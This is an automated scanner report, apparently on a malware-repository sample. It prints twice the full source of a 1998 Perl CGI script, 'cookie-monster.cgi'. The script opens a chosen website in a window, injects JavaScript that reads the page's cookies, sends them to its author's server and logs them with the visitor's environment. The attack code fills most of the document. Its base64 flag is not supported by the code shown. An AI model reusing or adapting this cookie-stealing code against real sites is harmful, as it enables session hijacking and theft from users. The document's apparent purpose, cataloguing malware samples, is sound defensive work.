{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "open": "May open a file"
        },
        "macro": "#!/usr/bin/perl\n#\n# cookie-monster.cgi -- Dan Brumleve <nothing@shout.net>, 1998.10.05\n\nuse CGI qw(escape unescape);\n\nmy $self = \"http://www.shout.net/nothing/son-of-cache-cow/cookie-monster.cgi\";\n\nmy $cgi = new CGI;\nmy $action = $cgi->param(\"action\");\n\nif (!$action) {\n  print \"Content-type: text/html\\n\\n\" . <<\"  EOF\";\n  <html>\n  <head>\n  <title>Cookie Monster</title>\n  </head>\n  <body bgcolor=#ffffff>\n  <h1>Cookie Monster</h1>\n  <form action=\"$self\" method=\"get\">\n  Enter a fully-qualified URL:\n  <input type=text name=q size=50 value=\"http://www.netscape.com/products/security/\"><br>\n  <input type=hidden name=action value=launch>\n  <input type=submit value=\"Give Dan Your Cookies\">\n  </form>\n  </body>\n  </html>\n  EOF\n  exit 0;\n}\n\nif ($action eq \"launch\") {\n  my $q = escape($cgi->param(\"q\"));\n  print \"Content-type: application/x-javascript\\n\\n\" . <<\"  EOF\";\n  var slave;\n\n  function report() {\n    slave.onunload = null;\n    slave.onload = null;\n    slave.location = \"$self\" + \"?\" + \"action=\" + escape(\"yum\");\n  }\n\n  function launch(x) {\n    var q = unescape(x);\n    slave = window.open(q, \"slave\");\n\n    slave.onload = report;\n  }\n\n  launch('$q');\n  EOF\n\n  exit 0;\n}\n\nif ($action eq \"yum\") {\n  print \"Content-type: application/x-javascript\\n\\n\" . <<\"  EOF\";\n  var l = \"$self\" + \"?\" +\n   \"action=\" + escape(\"show\") + \"&\" +\n   \"location=\" + escape(location) + \"&\" +\n   \"cookie=\" + escape(document.cookie);\n  window.opener.location = l;\n  window.close();\n  EOF\n  exit 0;\n}\n\nif ($action eq \"show\") {\n  my $location = $cgi->param(\"location\");\n  my $cookie = $cgi->param(\"cookie\");\n  if (open(FP, \">> logs/log-$ENV{REMOTE_ADDR}.txt\")) {\n    for (sort keys %ENV) { print FP $_ . \"=\" . $ENV{$_} . \"\\n\"; }\n    print FP \"\\n\";\n    print FP escape($location) . \": \" . escape($cookie) . \"\\n\\n\";\n    close(FP);\n  }\n  print \"Content-type: text/plain\\n\\n\" . <<\"  EOF\";\n  Cookies retrieved from \"$location\":\n\n  $cookie\n  EOF\n\n  exit 0;\n}"
    },
    "filename": "VirusShare_115d5fee85b0b804b72a48fdbc08ac63",
    "filesize": 1931,
    "filetype": "Perl script text executable",
    "hashes": {
        "md5": "115d5fee85b0b804b72a48fdbc08ac63",
        "sha1": "d421f942901429eb7cf5e1f0adb0d1b6b8a0ca82",
        "sha256": "6c0ac2138f8c9c0473f67b906a898db5e3d99472efc65922df84f1daad11c6a5"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "#!/usr/bin/perl",
            "# cookie-monster.cgi -- Dan Brumleve <nothing@shout.net>, 1998.10.05",
            "use CGI qw(escape unescape);",
            "my $self = \"http://www.shout.net/nothing/son-of-cache-cow/cookie-monster.cgi\";",
            "my $cgi = new CGI;",
            "my $action = $cgi->param(\"action\");",
            "if (!$action) {",
            "  print \"Content-type: text/html\\n\\n\" . <<\"  EOF\";",
            "  <html>",
            "  <head>",
            "  <title>Cookie Monster</title>",
            "  </head>",
            "  <body bgcolor=#ffffff>",
            "  <h1>Cookie Monster</h1>",
            "  <form action=\"$self\" method=\"get\">",
            "  Enter a fully-qualified URL:",
            "  <input type=text name=q size=50 value=\"http://www.netscape.com/products/security/\"><br>",
            "  <input type=hidden name=action value=launch>",
            "  <input type=submit value=\"Give Dan Your Cookies\">",
            "  </form>",
            "  </body>",
            "  </html>",
            "  EOF",
            "  exit 0;",
            "if ($action eq \"launch\") {",
            "  my $q = escape($cgi->param(\"q\"));",
            "  print \"Content-type: application/x-javascript\\n\\n\" . <<\"  EOF\";",
            "  var slave;",
            "  function report() {",
            "    slave.onunload = null;",
            "    slave.onload = null;",
            "    slave.location = \"$self\" + \"?\" + \"action=\" + escape(\"yum\");",
            "  function launch(x) {",
            "    var q = unescape(x);",
            "    slave = window.open(q, \"slave\");",
            "    slave.onload = report;",
            "  launch('$q');",
            "  EOF",
            "  exit 0;",
            "if ($action eq \"yum\") {",
            "  print \"Content-type: application/x-javascript\\n\\n\" . <<\"  EOF\";",
            "  var l = \"$self\" + \"?\" +",
            "   \"action=\" + escape(\"show\") + \"&\" +",
            "   \"location=\" + escape(location) + \"&\" +",
            "   \"cookie=\" + escape(document.cookie);",
            "  window.opener.location = l;",
            "  window.close();",
            "  EOF",
            "  exit 0;",
            "if ($action eq \"show\") {",
            "  my $location = $cgi->param(\"location\");",
            "  my $cookie = $cgi->param(\"cookie\");",
            "  if (open(FP, \">> logs/log-$ENV{REMOTE_ADDR}.txt\")) {",
            "    for (sort keys %ENV) { print FP $_ . \"=\" . $ENV{$_} . \"\\n\"; }",
            "    print FP \"\\n\";",
            "    print FP escape($location) . \": \" . escape($cookie) . \"\\n\\n\";",
            "    close(FP);",
            "  print \"Content-type: text/plain\\n\\n\" . <<\"  EOF\";",
            "  Cookies retrieved from \"$location\":",
            "  $cookie",
            "  EOF",
            "  exit 0;"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": [
            "http://www.netscape.com/products/security/",
            "http://www.shout.net/nothing/son-of-cache-cow/cookie-monster.cgi"
        ]
    },
    "time": "0:00:00.320937",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
